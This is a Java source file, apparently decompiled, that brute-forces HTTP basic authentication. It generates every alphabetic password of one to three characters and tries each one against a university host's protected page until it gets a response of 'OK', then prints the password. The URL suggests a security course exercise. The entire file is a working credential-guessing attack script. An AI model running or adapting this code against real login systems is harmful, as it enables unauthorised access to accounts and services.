public class BruteForce {
    boolean f00;
    int f10;
    String[] f20;
    java.util.Vector f30;
    BruteForce() {
        super();
        this.f00 = false;
        String[] a = new String[52];
        a[0] = "a";
        a[1] = "b";
        a[2] = "c";
        a[3] = "d";
        a[4] = "e";
        a[5] = "f";
        a[6] = "g";
        a[7] = "h";
        a[8] = "i";
        a[9] = "j";
        a[10] = "k";
        a[11] = "l";
        a[12] = "m";
        a[13] = "n";
        a[14] = "o";
        a[15] = "p";
        a[16] = "q";
        a[17] = "r";
        a[18] = "s";
        a[19] = "t";
        a[20] = "u";
        a[21] = "v";
        a[22] = "w";
        a[23] = "x";
        a[24] = "y";
        a[25] = "z";
        a[26] = "A";
        a[27] = "B";
        a[28] = "C";
        a[29] = "D";
        a[30] = "E";
        a[31] = "F";
        a[32] = "G";
        a[33] = "H";
        a[34] = "I";
        a[35] = "J";
        a[36] = "K";
        a[37] = "L";
        a[38] = "M";
        a[39] = "N";
        a[40] = "O";
        a[41] = "P";
        a[42] = "Q";
        a[43] = "R";
        a[44] = "S";
        a[45] = "T";
        a[46] = "U";
        a[47] = "V";
        a[48] = "W";
        a[49] = "X";
        a[50] = "Y";
        a[51] = "Z";
        this.f20 = a;
        this.f30 = new java.util.Vector();
        this.f10 = 0;
        this.m10();
        this.m00();
    }
    public void m00() {
        while ( this.f10 < this.f30.size() ) {
            this.f00 = this.m20();
            if ( this.f00 ) {
                System.out.print ( "The password is: " );
                System.out.println ( ( String ) this.f30.elementAt ( this.f10 - 1 ) );
                this.f10 = this.f30.size();
            }
        }
    }
    public void m10() {
        String s = new String();
        int i = 0;
        while ( i < 52 ) {
            String s0 = this.f20[i];
            this.f30.addElement ( ( Object ) s0 );
            i = i + 1;
        }
        int i0 = 0;
        while ( i0 < 52 ) {
            int i1 = 0;
            while ( i1 < 52 ) {
                String s1 = new StringBuilder().append ( this.f20[i0] ).append ( this.f20[i1] ).toString();
                this.f30.addElement ( ( Object ) s1 );
                i1 = i1 + 1;
            }
            i0 = i0 + 1;
        }
        int i2 = 0;
        while ( i2 < 52 ) {
            int i3 = 0;
            while ( i3 < 52 ) {
                int i4 = 0;
                while ( i4 < 52 ) {
                    String s2 = new StringBuilder().append ( this.f20[i2] ).append ( this.f20[i3] ).append ( this.f20[i4] ).toString();
                    this.f30.addElement ( ( Object ) s2 );
                    i4 = i4 + 1;
                }
                i3 = i3 + 1;
            }
            i2 = i2 + 1;
        }
    }
    public boolean m20() {
        java.net.Authenticator.setDefault ( ( java.net.Authenticator ) new BruteForce$MyAuthenticator ( this ) );
        try {
            java.net.HttpURLConnection a = ( java.net.HttpURLConnection ) new java.net.URL ( "http://sec-crack.cs.rmit.edu./SEC/2/" ).openConnection();
            a.connect();
            if ( a.getResponseMessage().equalsIgnoreCase ( "OK" ) ) {
                return true;
            }
        } catch ( java.io.IOException ignoredException ) {
        }
        return false;
    }
    public static void main ( String[] a ) {
        BruteForce a0 = new BruteForce();
    }
}
class BruteForce$MyAuthenticator extends java.net.Authenticator {
    final BruteForce this$0;
    BruteForce$MyAuthenticator ( BruteForce a ) {
        this.this$0 = a;
        super();
    }
    protected java.net.PasswordAuthentication getPasswordAuthentication() {
        String s = ( String ) this.this$0.f30.elementAt ( this.this$0.f10 );
        this.this$0.f10 = this.this$0.f10 + 1;
        return new java.net.PasswordAuthentication ( "", s.toCharArray() );
    }
}
